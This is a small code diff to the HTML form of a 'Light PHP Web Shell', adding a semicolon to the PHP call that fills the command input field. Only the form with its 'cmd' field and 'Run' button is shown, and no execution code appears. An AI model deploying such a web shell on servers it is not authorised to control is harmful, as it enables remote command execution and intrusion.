@@ -15,7 +15,7 @@
         <h2>Light PHP Web Shell</h2>
         <h3>Command Input</h3>
         <form method="post">
-            <input  class="cmd_input" type="text" name="cmd" value="<?php htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required />&nbsp;
+            <input  class="cmd_input" type="text" name="cmd" value="<?php htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'); ?>" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required />&nbsp;
             <button class="cmd_button" type="submit">Run ...</button>
         </form>
 
